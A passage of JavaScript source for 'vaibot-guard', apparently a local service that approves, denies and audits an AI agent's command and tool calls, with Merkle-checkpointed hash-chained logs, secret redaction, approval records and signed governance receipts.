  const approvalScope = APPROVAL_SCOPES.has(result?.approvalScope) ? result.approvalScope : null;
  const approvalChoice = APPROVAL_CHOICES.has(result?.approvalChoice) ? result.approvalChoice : null;
  const resolvedGate = shape.resolved;
  const hostApproval = hostApprovalFrom(result?.hostApproval);
  const bypassActive = hostBypass?.active === true;

  // #17: name the SIGNED policy bundle that governed this decision (decision-time
  // accurate, from the live F-157 state). Omitted under built-in defaults — the
  // server resolves the keccak anchor hash from this version. Falls back to the
  // legacy POLICY.version only when no signed bundle is in force.
  const signedPolicyVersion =
    SIGNED_POLICY?.source === "bundle" ? (POLICY_BUNDLE?.bundle?.version ?? null) : null;

  // Honesty: an ALLOW means the guard permitted the action. At PRECHECK there is no result
  // yet (result == null), so it is "allowed" — previously `result?.code !== 0` was true for a
  // null result, so every allowed action's precheck receipt read "blocked". Only downgrade to
  // "blocked" when a result is present AND the action actually failed (a finalize receipt).
  const failed = result != null && (result.ok === false || (result.code != null && result.code !== 0));
  let outcome = shape.outcome;

  const agentId = String(sessionId || "unknown-session");
  const policyReason = String(decision?.reason || risk?.reason || "Policy decision");
  const actionVerb = actionVerbFor({ mappedDecision, approvalStatus, observeMode: shape.observeMode });

  // The gate is resolved by the time this receipt is written, so say what
  // happened rather than restating the reason it was gated.
  const resultSummary =
    mappedDecision === "approval_required" && !observing
      ? humanDenied
        ? `Denied in the agent session — action did not run. ${policyReason}`
        : bypassed
          ? `Approval bypass honoured by policy — action ran without a human decision. ${policyReason}`
          : `Approved in the agent session — action ran. ${policyReason}`
      : policyReason;

  const receiptPayload = {
    run_id: runId,
    idempotency_key: `${runId}:finalize`,
    agent: { id: agentId, name: agentId },
    action: {
      tool: toolName,
      summary: `Agent ${actionVerb}: ${command.slice(0, 100)}`,
      command,
      cwd,
    },
    policy: {
      risk_level: riskLevel,
      decision: mappedDecision,
      reason: policyReason,
      ...(signedPolicyVersion ? { policy_version: signedPolicyVersion } : {}),
      ...(typeof decision?.ruleId === "string" && decision.ruleId ? { rule_id: decision.ruleId } : {}),
    },
    approval: {
      status: approvalStatus,
      ...(resolvedGate && approvalScope ? { scope: approvalScope } : {}),
      ...(resolvedGate && approvalChoice ? { choice: approvalChoice } : {}),
    },
    // Posture, recorded on every receipt and never folded into the decision:
    // "what ran while approvals were bypassed?" becomes a query.
    host_bypass_active: bypassActive,
    // Observe enforces nothing, so nothing was overridden either.
    bypass_override: bypassed && !observing,
    ...(bypassActive && hostBypass?.mechanism ? { host_bypass_mechanism: hostBypass.mechanism } : {}),
    // The host's OWN approval prompt (e.g. Hermes' dangerous-command check),
    // which can fire on a call VAIBot allowed.
    ...(hostApproval ? { host_approval: hostApproval } : {}),
    // The server filters observe-mode shadow rows out of the pending queue by
    // this flag. The guard never sent it, so every shadow decision was stored
    // observe_mode=false and surfaced as a live approval the user had to act
    // on — for an account in observe mode, that is the whole pending queue.
    observe_mode: shape.observeMode,
    result: {
      outcome,
      summary: resultSummary,
    },
  };

  // GOVERNANCE_BASE is e.g. https://api.vaibot.io — v2 routes hang directly off it.
  const targetUrl = new URL(GOVERNANCE_BASE.replace(/\/$/, "") + "/v2/receipts");
  const body = JSON.stringify(receiptPayload);

  const options = {
    method: "POST",
    hostname: targetUrl.hostname,
    port: targetUrl.port || (targetUrl.protocol === "https:" ? 443 : 80),
    path: targetUrl.pathname,
    headers: {
      "content-type": "application/json; charset=utf-8",
      "content-length": Buffer.byteLength(body),
      "authorization": `Bearer ${VAIBOT_API_KEY}`,
    },
    timeout: 8000,
  };

  const transport = targetUrl.protocol === "https:" ? https : http;

  return new Promise((resolve) => {
    const req = transport.request(options, (res) => {
      let data = "";
      res.on("data", (c) => (data += c));
      res.on("end", () => {
        try { resolve(JSON.parse(data || "{}")); }
        catch { resolve({ ok: false, raw: data.slice(0, 200) }); }
      });
    });
    req.on("timeout", () => { req.destroy(); resolve({ ok: false, error: "timeout" }); });
    req.on("error", (e) => resolve({ ok: false, error: e?.message }));
    req.write(body);
    req.end();
  });
}

const MERKLE_CHECKPOINT_EVERY = Math.max(1, Number(process.env.VAIBOT_MERKLE_CHECKPOINT_EVERY || 50));
const MERKLE_CHECKPOINT_EVERY_MS = Math.max(10_000, Number(process.env.VAIBOT_MERKLE_CHECKPOINT_EVERY_MS || 10 * 60 * 1000));

// Track which sessions have produced events so periodic checkpointing can run.
const SEEN_SESSIONS = new Set();

function leafHash(eventHash) {
  return sha256("leaf:" + eventHash);
}

function parentHash(left, right) {
  return sha256("node:" + left + ":" + right);
}

function loadMerkleState(sessionId) {
  const p = path.join(LOG_DIR, `${sessionId}.merkle.json`);
  if (!fs.existsSync(p)) {
    return {
      count: 0,
      frontier: [],
      lastCheckpointSeq: 0,
      lastCheckpointHash: "",
      lastCheckpointAtMs: 0,
      lastCheckpointEventCount: 0,
      lastAnchoredSeq: 0,
    };
  }
  try {
    const j = JSON.parse(fs.readFileSync(p, "utf8"));
    return {
      count: Number(j.count || 0),
      frontier: Array.isArray(j.frontier) ? j.frontier.map((v) => (v === null ? null : String(v))) : [],
      lastCheckpointSeq: Number(j.lastCheckpointSeq || 0),
      lastCheckpointHash: String(j.lastCheckpointHash || ""),
      lastCheckpointAtMs: Number(j.lastCheckpointAtMs || 0),
      lastCheckpointEventCount: Number(j.lastCheckpointEventCount || 0),
      lastAnchoredSeq: Number(j.lastAnchoredSeq || 0),
    };
  } catch {
    return {
      count: 0,
      frontier: [],
      lastCheckpointSeq: 0,
      lastCheckpointHash: "",
      lastCheckpointAtMs: 0,
      lastCheckpointEventCount: 0,
      lastAnchoredSeq: 0,
    };
  }
}

function saveMerkleState(sessionId, st) {
  const p = path.join(LOG_DIR, `${sessionId}.merkle.json`);
  fs.writeFileSync(p, JSON.stringify(st, null, 2) + "\n");
}

function computeRoot(frontier) {
  // Fold highest->lowest to produce a single root.
  let acc = null;
  for (let level = frontier.length - 1; level >= 0; level--) {
    const h = frontier[level];
    if (!h) continue;
    acc = acc ? parentHash(h, acc) : h;
  }
  return acc || sha256("empty");
}

function appendLeaf(sessionId, leaf) {
  const p = path.join(LOG_DIR, `${sessionId}.leaves.jsonl`);
  fs.appendFileSync(p, stableStringify({ leaf }) + "\n");
}

function merkleAppend(sessionId, eventHash) {
  const st = loadMerkleState(sessionId);
  const leaf = leafHash(eventHash);
  appendLeaf(sessionId, leaf);

  let node = leaf;
  let level = 0;
  while (true) {
    if (!st.frontier[level]) {
      st.frontier[level] = node;
      break;
    }
    node = parentHash(st.frontier[level], node);
    st.frontier[level] = null;
    level++;
  }
  st.count += 1;
  // Trim trailing nulls
  while (st.frontier.length && st.frontier[st.frontier.length - 1] === null) {
    st.frontier.pop();
  }
  saveMerkleState(sessionId, st);
  return { count: st.count, root: computeRoot(st.frontier) };
}

function loadCheckpoints(sessionId) {
  const cpPath = path.join(LOG_DIR, `${sessionId}.checkpoints.jsonl`);
  if (!fs.existsSync(cpPath)) return [];
  return fs.readFileSync(cpPath, "utf8").split("\n").filter(Boolean).map((l) => JSON.parse(l));
}

function loadLeaves(sessionId, count) {
  const p = path.join(LOG_DIR, `${sessionId}.leaves.jsonl`);
  if (!fs.existsSync(p)) return [];
  const lines = fs.readFileSync(p, "utf8").split("\n").filter(Boolean);
  const sliced = typeof count === "number" ? lines.slice(0, count) : lines;
  return sliced.map((l) => JSON.parse(l).leaf);
}

function nextLevel(nodes) {
  const out = [];
  for (let i = 0; i < nodes.length; i += 2) {
    const left = nodes[i];
    const right = nodes[i + 1] || nodes[i]; // duplicate last if odd
    out.push(parentHash(left, right));
  }
  return out;
}

function buildInclusionProof(leaves, index) {
  if (index < 0 || index >= leaves.length) throw new Error("index out of range");
  let idx = index;
  let level = leaves.slice();
  const siblings = [];

  while (level.length > 1) {
    const isRight = idx % 2 === 1;
    const sibIdx = isRight ? idx - 1 : idx + 1;
    const sib = level[sibIdx] ?? level[idx];
    siblings.push(sib);
    idx = Math.floor(idx / 2);
    level = nextLevel(level);
  }

  return { leaf: leaves[index], siblings, root: level[0] };
}

async function tryFlushCheckpoints(sessionId) {
  if (VAIBOT_PROVE_MODE === "off") return;
  const proveConfigured = !!(PROVENANCE_BASE && VAIBOT_API_KEY);
  if (!proveConfigured) {
    if (VAIBOT_PROVE_MODE === "required") {
      throw new Error("VAIBOT_PROVE_MODE=required but no provenance API key configured");
    }
    return;
  }

  const st = loadMerkleState(sessionId);
  const cps = loadCheckpoints(sessionId);
  for (const cp of cps) {
    if (cp.seq <= st.lastAnchoredSeq) continue;

    const receipt = {
      schema: "vaibot-guard/checkpoint@0.1",
      kind: "merkle.checkpoint",
      ts: cp.ts,
      sessionId,
      seq: cp.seq,
      count: cp.count,
      root: cp.root,
      range: cp.range,
      prevCheckpointHash: cp.prevCheckpointHash,
    };

    // Prove checkpoint root (idempotent)
    await postVaibotProve({ receipt, idempotencyKey: `${sessionId}:checkpoint:${cp.seq}` });

    st.lastAnchoredSeq = cp.seq;
    saveMerkleState(sessionId, st);
  }
}

function appendCheckpoint(sessionId, checkpoint) {
  const p = path.join(LOG_DIR, `${sessionId}.checkpoints.jsonl`);
  fs.appendFileSync(p, stableStringify(checkpoint) + "\n");
}

function createCheckpointIfNeeded(sessionId, reason) {
  const st = loadMerkleState(sessionId);
  if (st.count <= st.lastCheckpointEventCount) return null;

  const root = computeRoot(st.frontier);
  const seq = st.lastCheckpointSeq + 1;
  const checkpoint = {
    schema: "vaibot-guard/checkpoint@0.1",
    ts: nowIso(),
    sessionId,
    seq,
    count: st.count,
    root,
    range: { uptoEventCount: st.count },
    reason,
    prevCheckpointHash: st.lastCheckpointHash || "",
    policyVersion: POLICY.version,
    guardVersion: "0.1",
    hashAlg: "sha256",
    merkle: {
      leaf: "sha256(\"leaf:\"+eventHash)",
      node: "sha256(\"node:\"+left+\":\"+right)",
    },
  };

  // domain-separated checkpoint hash (exclude existing hash field in the digest)
  const { hash: _ignore, ...cpNoHash } = checkpoint;
  checkpoint.hash = hashCheckpoint("checkpoint:" + stableStringify(cpNoHash));

  appendCheckpoint(sessionId, checkpoint);

  st.lastCheckpointSeq = seq;
  st.lastCheckpointHash = checkpoint.hash;
  st.lastCheckpointAtMs = Date.now();
  st.lastCheckpointEventCount = st.count;
  saveMerkleState(sessionId, st);

  return checkpoint;
}

// Replace the user's home-dir prefix with "~" so persisted/proven strings (cwd,
// workspaceDir, paths inside commands) don't leak the OS username (PII). Best-effort:
// a no-op when HOME is unset, and it only rewrites `$HOME/...` occurrences (never a
// bare substring), so it can't corrupt unrelated text. NOTE: this strips the username
// only — deeper path PII (client/person names inside project dirs) is not handled here.
function collapseHome(p) {
  const s = String(p ?? "");
  const home = process.env.HOME || "";
  if (!home || !s) return s;
  if (s === home) return "~";
  return s.split(home + "/").join("~/");
}

function redactString(s) {
  let out = String(s);
  for (const pat of POLICY.redactPatterns) {
    try {
      out = out.replace(new RegExp(pat, "g"), "[REDACTED]");
    } catch {
      // ignore bad patterns
    }
  }
  return collapseHome(out);
}

function redactIntent(intent) {
  if (!intent || typeof intent !== "object") return intent;
  const clone = JSON.parse(JSON.stringify(intent));

  // Redact env_keys if they look secret-like
  if (Array.isArray(clone.env_keys)) {
    clone.env_keys = clone.env_keys.map((k) => {
      const ks = String(k);
      const shouldRedact = POLICY.redactEnvKeyPatterns.some((p) => {
        try { return new RegExp(p).test(ks); } catch { return false; }
      });
      return shouldRedact ? "[REDACTED_ENV_KEY]" : ks;
    });
  }

  // Redact command/args strings by pattern
  if (typeof clone.command === "string") clone.command = redactString(clone.command);
  if (Array.isArray(clone.args)) clone.args = clone.args.map((a) => redactString(a));

  // Redact network destinations (URLs can carry tokens)
  if (clone.network && Array.isArray(clone.network.destinations)) {
    clone.network.destinations = clone.network.destinations.map((d) => redactString(d));
  }

  // Collapse home-dir paths so cwd/workspace don't leak the OS username (PII).
  if (typeof clone.cwd === "string") clone.cwd = collapseHome(clone.cwd);
  if (typeof clone.workspaceDir === "string") clone.workspaceDir = collapseHome(clone.workspaceDir);

  return clone;
}

function appendAudit(event) {
  const sessionId = event.sessionId || "unknown-session";
  const logPath = path.join(LOG_DIR, `${sessionId}.jsonl`);
  const prevHashPath = path.join(LOG_DIR, `${sessionId}.prevhash`);
  const prevHash = fs.existsSync(prevHashPath) ? fs.readFileSync(prevHashPath, "utf8").trim() : "";

  // Redact sensitive strings before persistence/proving.
  const safeEvent = { ...event };
  if (safeEvent.intent) safeEvent.intent = redactIntent(safeEvent.intent);
  if (typeof safeEvent.workspaceDir === "string") safeEvent.workspaceDir = collapseHome(safeEvent.workspaceDir);
  // Top-level cmd/args on exec leaves carry raw paths (and secrets) too — redact +
  // collapse them, not just the intent copy.
  if (typeof safeEvent.cmd === "string") safeEvent.cmd = redactString(safeEvent.cmd);
  if (Array.isArray(safeEvent.args)) safeEvent.args = safeEvent.args.map(redactString);
  const fullEvent = { ...safeEvent, prevHash };
  const line = stableStringify(fullEvent);
  const h = sha256(line);

  fs.appendFileSync(logPath, line + "\n");
  fs.writeFileSync(prevHashPath, h + "\n");

  SEEN_SESSIONS.add(sessionId);

  // Merkle accumulator update + periodic checkpoints
  const merkle = merkleAppend(sessionId, h);

  // Checkpointing: whichever comes first (count delta or time interval)
  try {
    const st = loadMerkleState(sessionId);
    const delta = st.count - (st.lastCheckpointEventCount || 0);
    const dueByCount = delta >= MERKLE_CHECKPOINT_EVERY;
    const dueByTime = !st.lastCheckpointAtMs || (Date.now() - st.lastCheckpointAtMs) >= MERKLE_CHECKPOINT_EVERY_MS;

    if (dueByCount) {
      createCheckpointIfNeeded(sessionId, "count");
      tryFlushCheckpoints(sessionId).catch(() => {});
    } else if (dueByTime && st.count > (st.lastCheckpointEventCount || 0)) {
      // Only checkpoint by time if new events arrived
      createCheckpointIfNeeded(sessionId, "time");
      tryFlushCheckpoints(sessionId).catch(() => {});
    }
  } catch {
    // ignore checkpoint scheduling errors
  }

  return { hash: h, prevHash, merkle };
}

const server = http.createServer(async (req, res) => {
  try {
    if (req.method === "GET" && req.url === "/health") {
      return json(res, 200, { ok: true, service: "vaibot-guard", version: GUARD_VERSION, instanceId: INSTANCE_ID, ts: nowIso(), effective_mode: EFFECTIVE_MODE, capabilities: GUARD_CAPABILITIES, contained: CONTAINMENT_ARMED });
    }

    // Read-only view of the active signed policy + provenance (F-155). Like
    // /health it is unauthenticated: the policy is enforcement metadata, not a
    // secret, and the guard binds 127.0.0.1 only. `vaibot policy list` reads this.
    if (req.method === "GET" && req.url === "/v1/policy") {
      const b = POLICY_BUNDLE.bundle;
      return json(res, 200, {
        ok: true,
        source: SIGNED_POLICY.source, // "bundle" (verified) | "builtin" (fail-closed default)
        signature: b ? (POLICY_BUNDLE.ok ? "ok" : POLICY_BUNDLE.reason) : "no-bundle",
        bundle: b
          ? {
              schema: b.schema ?? null,
              version: b.version ?? null,
              issuer: b.issuer ?? null,
              issuedAt: b.issuedAt ?? null,
              expiresAt: b.expiresAt ?? null,
              hash: computeBundleHash(b),
            }
          : null,
        denylist: SIGNED_DENYLIST,
        classifierTablesPresent: !!CLASSIFIER_TABLES,
        // What happens to an escalation while an agent host bypasses approvals.
        hostBypassAction: EFFECTIVE_HOST_BYPASS_ACTION,
      });
    }

    // On-demand mode re-poll: force an immediate control-plane fetch of the account
    // mode so `vaibot mode show` (and what agents enforce) reflects a just-changed
    // mode without waiting for the background timer. Authed — it triggers an outbound
    // /me fetch and can flip what the guard enforces. Returns the (possibly updated)
    // effective_mode the guard now enforces, so the CLI display stays honest.
    if (req.method === "POST" && req.url === "/v1/mode/refresh") {
      if (!requireAuth(req, res)) return;
      await refreshEffectiveMode();
      return json(res, 200, { ok: true, effective_mode: EFFECTIVE_MODE });
    }

    // policy hot-reload disabled (restart service to apply policy changes)

    if (req.method === "POST" && req.url === "/api/proof") {
      if (!requireAuth(req, res)) return;
      const raw = await readBody(req);
      let input;
      try {
        input = JSON.parse(raw || "{}");
      } catch {
        return json(res, 400, { ok: false, error: "Invalid JSON" });
      }

      const sessionId = String(input.sessionId || "unknown-session");
      const index = Number(input.index);
      const checkpointSeq = Number(input.checkpointSeq);
      if (!Number.isFinite(index) || index < 0) return json(res, 400, { ok: false, error: "Missing/invalid index" });
      if (!Number.isFinite(checkpointSeq) || checkpointSeq < 1) return json(res, 400, { ok: false, error: "Missing/invalid checkpointSeq" });

      const cps = loadCheckpoints(sessionId);
      const cp = cps.find((c) => c.seq === checkpointSeq);
      if (!cp) return json(res, 404, { ok: false, error: "Checkpoint not found" });

      const leaves = loadLeaves(sessionId, cp.count);
      const proof = buildInclusionProof(leaves, index);

      // Sanity: computed root should match checkpoint root
      const rootMatches = proof.root === cp.root;

      return json(res, 200, {
        ok: true,
        sessionId,
        index,
        count: cp.count,
        leaf: proof.leaf,
        siblings: proof.siblings,
        root: proof.root,
        rootMatches,
        checkpoint: { seq: cp.seq, root: cp.root, count: cp.count },
      });
    }

    if (req.method === "POST" && req.url === "/v1/flush") {
      if (!requireAuth(req, res)) return;
      const raw = await readBody(req);
      let input;
      try {
        input = JSON.parse(raw || "{}");
      } catch {
        return json(res, 400, { ok: false, error: "Invalid JSON" });
      }
      const sessionId = String(input.sessionId || "unknown-session");
      try {
        await tryFlushCheckpoints(sessionId);
        const st = loadMerkleState(sessionId);
        return json(res, 200, { ok: true, sessionId, lastAnchoredSeq: st.lastAnchoredSeq, lastCheckpointSeq: st.lastCheckpointSeq });
      } catch (e) {
        return json(res, 500, { ok: false, error: e?.message || String(e) });
      }
    }

    // ---------------------------------------------------------------------
    // Approvals (chat-command UX)
    // ---------------------------------------------------------------------

    if (req.method === "POST" && req.url === "/v1/approvals/list") {
      if (!requireAuth(req, res)) return;
      const raw = await readBody(req);
      let input;
      try {
        input = JSON.parse(raw || "{}");
      } catch {
        return json(res, 400, { ok: false, error: "Invalid JSON" });
      }

      const sessionId = String(input.sessionId || "");
      const approvals = listApprovals({ status: "pending", sessionId: sessionId || undefined }).map((a) => ({
        approvalId: a.approvalId,
        status: a.status,
        createdAt: a.createdAt,
        expiresAt: a.expiresAt,
        reason: a.reason,
        kind: a.kind,
        request: a.request,
      }));

      return json(res, 200, { ok: true, approvals });
    }

    if (req.method === "POST" && req.url === "/v1/approvals/resolve") {
      if (!requireAuth(req, res)) return;
      const raw = await readBody(req);
      let input;
      try {
        input = JSON.parse(raw || "{}");
      } catch {
        return json(res, 400, { ok: false, error: "Invalid JSON" });
      }

      const approvalId = String(input.approvalId || "");
      const action = String(input.action || "");
      if (!approvalId) return json(res, 400, { ok: false, error: "Missing approvalId" });
      if (action !== "approve" && action !== "deny") return json(res, 400, { ok: false, error: "Invalid action" });

      const out = resolveApproval({ approvalId, action });
      if (!out.ok) return json(res, 400, out);
      return json(res, 200, out);
    }

    if (req.method === "POST" && req.url === "/v1/decide/exec") {
      if (!requireAuth(req, res)) return;
      const raw = await readBody(req);
      let input;
      try {
        input = JSON.parse(raw || "{}");
      } catch {
        return json(res, 400, { ok: false, error: "Invalid JSON" });
      }

      const sessionId = String(input.sessionId || "unknown-session");
      const cmd = String(input.cmd || "");
      const args = Array.isArray(input.args) ? input.args.map(String) : [];
      const intent = input.intent;

      if (!cmd) return json(res, 400, { ok: false, error: "Missing cmd" });

      const risk = classifyRisk({ intent, cmd, args });
      const receiptTier = receiptTierForExec(cmd, args);
      const hostBypass = parseHostBypass(input.hostBypass);
      const decision = applyHostBypass(decideExec({ sessionId, cmd, args, intent }), hostBypass);
      // Receipt honesty: fold the fine-grained classifier's risk into the coarse structural
      // risk so risk_level reflects what actually drove the gate on EVERY decision path
      // (approveToken / deny-token / catastrophic-floor), not only the allow/escalate
      // returns. Same classify() inputs as decideExec, so risk matches the decision.
      try {
        const clsRisk = classify({ tool: "exec", input: { command: [cmd, ...(args || [])].join(" ") } }, { tables: CLASSIFIER_TABLES, escalateAt: SIGNED_ESCALATE_AT, guardPort: PORT }).risk;
        risk.risk = mergeReceiptRisk(risk.risk, clsRisk);
      } catch { /* keep coarse risk on classifier error */ }
      const runId = `run_${randomUUID()}`;

      const eventId = randomUUID();
      const audit = appendAudit({
        ts: nowIso(),
        eventId,
        kind: "exec.precheck",
        sessionId,
        runId,
        cmd,
        args,
        risk,
        receiptTier,
        decision,
        intent,
      });

      postContainmentDenyReceipt({
        runId,
        sessionId,
        intent: { cmd, args, workspaceDir: WORKSPACE },
        decision,
        risk,
        effectiveMode: EFFECTIVE_MODE,
      });

      // Prove the *precheck receipt* (best-effort unless VAIBOT_PROVE_MODE=required).
      let prove = null;
      let proveError = null;
      try {
        const receipt = {
          schema: "vaibot-guard/receipt@0.1",
          kind: "exec",
          ts: nowIso(),
          runId,
          sessionId,
          policyVersion: POLICY.version,
          risk,
          intent,
          decision,
          result: null,
          audit,
        };
        prove = await postVaibotProve({ receipt, idempotencyKey: runId + ":precheck" });
      } catch (e) {
        proveError = e?.message || String(e);
        prove = { ok: false, error: proveError };
      }

      // Fail-closed: if required mode is enabled, deny execution if we cannot prove the precheck receipt.
      if (VAIBOT_PROVE_MODE === "required") {
        if (!PROVENANCE_BASE || !VAIBOT_API_KEY) {
          return json(res, 200, {
            ok: true,
            runId,
            risk,
            decision: { decision: "deny", reason: "VAIBOT_PROVE_MODE=required but no provenance API key configured" },
            audit,
            prove,
          });
        }
        if (proveError || (prove && prove.ok === false)) {
          return json(res, 200, {
            ok: true,
            runId,
            risk,
            decision: { decision: "deny", reason: `VAIBOT_PROVE_MODE=required but /api/prove failed: ${proveError || prove?.error || "unknown"}` },
            audit,
            prove,
          });
        }
      }

      // Store context for finalize (persisted).
      // effectiveMode is captured at DECIDE time: the mode that actually
      // governed this action, not whatever the poll has drifted to by finalize.
      writeRunContext(runId, { sessionId, risk, receiptTier, intent, decision, precheckAudit: audit, ts: nowIso(), policyVersion: POLICY.version, effectiveMode: EFFECTIVE_MODE, hostBypass });

      return json(res, 200, { ok: true, runId, risk, receiptTier, decision, audit, prove, effective_mode: EFFECTIVE_MODE, host_bypass_action: EFFECTIVE_HOST_BYPASS_ACTION, contained: CONTAINMENT_ARMED });
    }

    if (req.method === "POST" && req.url === "/v1/decide/tool") {
      if (!requireAuth(req, res)) return;
      const raw = await readBody(req);
      let input;
      try {
        input = JSON.parse(raw || "{}");
      } catch {
        return json(res, 400, { ok: false, error: "Invalid JSON" });
      }

      const sessionId = String(input.sessionId || "unknown-session");
      const toolName = String(input.toolName || "");
      const params = input.params && typeof input.params === "object" ? input.params : {};
      const workspaceDir = String(input.workspaceDir || input.cwd || "");

      if (!toolName) return json(res, 400, { ok: false, error: "Missing toolName" });

      const risk = classifyToolRisk({ toolName, params, workspaceDir });
      const receiptTier = receiptTierForTool(toolName, params);
      // Receipt honesty: fold the fine-grained classifier's risk into the coarse tool risk
      // so risk_level matches the decision on every path (see the exec handler note). Same
      // classify() inputs as decideTool.
      try {
        const clsRisk = classify({ tool: toolName, input: params }, { tables: CLASSIFIER_TABLES, escalateAt: SIGNED_ESCALATE_AT, guardPort: PORT }).risk;
        risk.risk = mergeReceiptRisk(risk.risk, clsRisk);
      } catch { /* keep coarse risk on classifier error */ }

      const paramsHash = `sha256:${sha256(stableStringify({ toolName, params }))}`;
      const approvalId = String(input?.approval?.approvalId || "");
      const hostBypass = parseHostBypass(input.hostBypass);

      let decision;

      // Approval redemption path: if caller presents an approvalId, verify it matches this exact request.
      if (approvalId) {
        const appr = readApproval(approvalId);
        if (!appr) {
          decision = { decision: "deny", reason: "Approval not found" };
        } else if (appr.kind !== "tool") {
          decision = { decision: "deny", reason: "Approval kind mismatch" };
        } else if (appr.sessionId && appr.sessionId !== sessionId) {
          decision = { decision: "deny", reason: "Approval session mismatch" };
        } else if (appr.status !== "approved") {
          decision = { decision: "deny", reason: `Approval not approved (status=${appr.status})` };
        } else if (appr.expiresAt && Date.now() > Date.parse(appr.expiresAt)) {
          decision = { decision: "deny", reason: "Approval expired" };
        } else if (appr.request?.paramsHash && appr.request.paramsHash !== paramsHash) {
          decision = { decision: "deny", reason: "Approval scope mismatch" };
        } else {
          // G-162: deny is un-overridable. Re-evaluate current policy; a valid
          // approval may only upgrade an ask/approve outcome to allow — it can
          // never resurrect an action the policy now denies (e.g. after a bundle
          // refresh adds it to the denylist). Future-proofs F-157 runtime refresh.
          const fresh = decideTool({ sessionId, toolName, params, workspaceDir });
          if (fresh.decision === "deny") {
            decision = fresh;
          } else {
            decision = { decision: "allow", reason: "Approved by user", approvalId };
            markApprovalUsed({ approvalId });
          }
        }
      } else {
        // Applied before an approval record is minted: an escalation the policy
        // blocks under a host bypass never becomes a redeemable approval.
        decision = applyHostBypass(decideTool({ sessionId, toolName, params, workspaceDir }), hostBypass);

        // If policy requires approval, mint an approval record for chat-command resolution.
        if (decision && decision.decision === "approve") {
          const existingId = decision.approvalId;
          const already = existingId ? readApproval(existingId) : null;
          const appr = already
            ? already
            : createApproval({
                sessionId,
                kind: "tool",
                approvalId: existingId,
                reason: decision.reason || "Approval required",
                request: {
                  toolName,
                  paramsHash,
                  paramsPreview: redactIntent(params),
                },
              });

          decision.approvalId = appr.approvalId;
          decision.expiresAt = appr.expiresAt;
          decision.scope = { paramsHash };
        }
      }

      const runId = `run_${randomUUID()}`;

      const eventId = randomUUID();
      const audit = appendAudit({
        ts: nowIso(),
        eventId,
        kind: "tool.precheck",
        sessionId,
        runId,
        toolName,
        params: redactIntent(params),
        workspaceDir,
        risk,
        receiptTier,
        decision,
      });

      postContainmentDenyReceipt({
        runId,
        sessionId,
        intent: { toolName, params, workspaceDir },
        decision,
        risk,
        effectiveMode: EFFECTIVE_MODE,
      });

      // Prove the *precheck receipt* (best-effort unless VAIBOT_PROVE_MODE=required).
      let prove = null;
      let proveError = null;
      try {
        const receipt = {
          schema: "vaibot-guard/receipt@0.1",
          kind: "tool",
          ts: nowIso(),
          runId,
          sessionId,
          policyVersion: POLICY.version,
          risk,
          intent: { toolName, params: redactIntent(params), workspaceDir },
          decision,
          result: null,
          audit,
        };
        prove = await postVaibotProve({ receipt, idempotencyKey: runId + ":precheck" });
      } catch (e) {
        proveError = e?.message || String(e);
        prove = { ok: false, error: proveError };
      }

      if (VAIBOT_PROVE_MODE === "required") {
        if (!PROVENANCE_BASE || !VAIBOT_API_KEY) {
          return json(res, 200, {
            ok: true,
            runId,
            risk,
            decision: { decision: "deny", reason: "VAIBOT_PROVE_MODE=required but no provenance API key configured" },
            audit,
            prove,
          });
        }
        if (proveError || (prove && prove.ok === false)) {
          return json(res, 200, {
            ok: true,
            runId,
            risk,
            decision: { decision: "deny", reason: `VAIBOT_PROVE_MODE=required but /api/prove failed: ${proveError || prove?.error || "unknown"}` },
            audit,
            prove,
          });
        }
      }

      writeRunContext(runId, {
        sessionId,
        risk,
        receiptTier,
        intent: { toolName, params: redactIntent(params), workspaceDir },
        decision,
        precheckAudit: audit,
        ts: nowIso(),
        policyVersion: POLICY.version,
        effectiveMode: EFFECTIVE_MODE,
        hostBypass,
      });

      return json(res, 200, { ok: true, runId, risk, receiptTier, decision, audit, prove, effective_mode: EFFECTIVE_MODE, host_bypass_action: EFFECTIVE_HOST_BYPASS_ACTION, contained: CONTAINMENT_ARMED });
    }

    if (req.method === "POST" && req.url === "/v1/finalize/tool") {
      if (!requireAuth(req, res)) return;
      const raw = await readBody(req);
      let input;
      try {
        input = JSON.parse(raw || "{}");
      } catch {
        return json(res, 400, { ok: false, error: "Invalid JSON" });
      }

      const sessionId = String(input.sessionId || "unknown-session");
      const runId = String(input.runId || "");
      const result = input.result;

      if (!runId) return json(res, 400, { ok: false, error: "Missing runId" });

      const ctx1 = readRunContext(runId);
      const effectiveSessionId = String(ctx1?.sessionId || sessionId || "unknown-session");

      const eventId = randomUUID();
      const audit = appendAudit({
        ts: nowIso(),
        eventId,
        kind: "tool.finalize",
        sessionId: effectiveSessionId,
        runId,
        result: redactIntent(result),
      });

      let prove = null;
      let proveError = null;
      try {
        const ctx = readRunContext(runId);
        const receipt = {
          schema: "vaibot-guard/receipt@0.1",
          kind: "tool",
          ts: nowIso(),
          runId,
          sessionId: effectiveSessionId,
          policyVersion: POLICY.version,
          risk: ctx?.risk ?? null,
          intent: ctx?.intent ?? null,
          decision: ctx?.decision ?? null,
          result: redactIntent(result),
          audit,
          precheckAudit: ctx?.precheckAudit ?? null,
        };
        prove = await postVaibotProve({ receipt, idempotencyKey: runId + ":finalize" });
      } catch (e) {
        proveError = e?.message || String(e);
        prove = { ok: false, error: proveError };
      }

      if (VAIBOT_PROVE_MODE === "required") {
        if (!PROVENANCE_BASE || !VAIBOT_API_KEY) {
          return json(res, 500, { ok: false, error: "VAIBOT_PROVE_MODE=required but no provenance API key configured", audit, prove });
        }
        if (proveError || (prove && prove.ok === false)) {
          return json(res, 500, { ok: false, error: `VAIBOT_PROVE_MODE=required but /api/prove finalize failed: ${proveError || prove?.error || "unknown"}`, audit, prove });
        }
      }

      // A rejected gate is terminal: burn the local approval record so a retry
      // of the same intent cannot redeem an approval the user just refused.
      // Best-effort — an already-expired/used record simply has nothing to do.
      if (result?.approval === "denied" && ctx1?.decision?.approvalId) {
        try { resolveApproval({ approvalId: ctx1.decision.approvalId, action: "deny" }); }
        catch { /* already resolved or expired */ }
      }

      // M: a tier-2 governance receipt is earned, not automatic. Only egress/network
      // or high/dangerous calls get a signed receipt; ledger-tier calls are already
      // covered by the tier-1 Merkle ledger above. Missing tier => emit (fail-safe:
      // degrade toward more provenance, never silently drop an audit trail).
      const receiptTier = ctx1?.receiptTier ?? "receipt";
      const receiptEmitted = receiptTier === "receipt";
      if (receiptEmitted) {
        postGovernanceReceipt({
          runId,
          sessionId: effectiveSessionId,
          intent: ctx1?.intent,
          decision: ctx1?.decision,
          risk: ctx1?.risk,
          result,
          policyVersion: ctx1?.policyVersion,
